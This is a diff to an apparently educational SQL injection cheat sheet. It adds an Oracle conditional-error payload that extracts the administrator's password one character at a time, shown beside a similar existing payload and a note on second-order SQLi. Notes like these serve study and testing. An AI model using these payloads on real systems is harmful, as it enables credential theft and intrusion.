@@ -143,6 +143,7 @@ xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a          # we force D
 ```
 ```
 xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
+xyz' AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'a') THEN TO_CHAR(1/0) ELSE 'Z' END FROM dual) = 'Z
 ```
 In such case if 1 character of password is more then 'm', nothing happens. But if it's smaller, we force DB to 1/0, which throws an error  
 For different DBs:
@@ -153,7 +154,6 @@ For different DBs:
 
 ### Second-order SQLi
 SQLi which is stored inside server/database and executed later with another HTTP request. Also called stored SQLi  
-
 
 
 
